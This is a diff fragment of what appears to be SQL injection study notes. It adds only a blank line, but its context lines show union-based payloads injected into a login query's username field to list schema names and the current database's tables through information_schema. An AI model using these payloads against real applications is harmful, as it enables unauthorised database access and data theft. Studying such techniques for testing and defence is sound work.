@@ -334,6 +334,7 @@ SELECT * FROM users WHERE username='-1' or '1'='1' union SELECT 1,schema_name,2 
 ```sql
 SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- ' AND password='$password';
 ```
+
 - 字段名
 
 
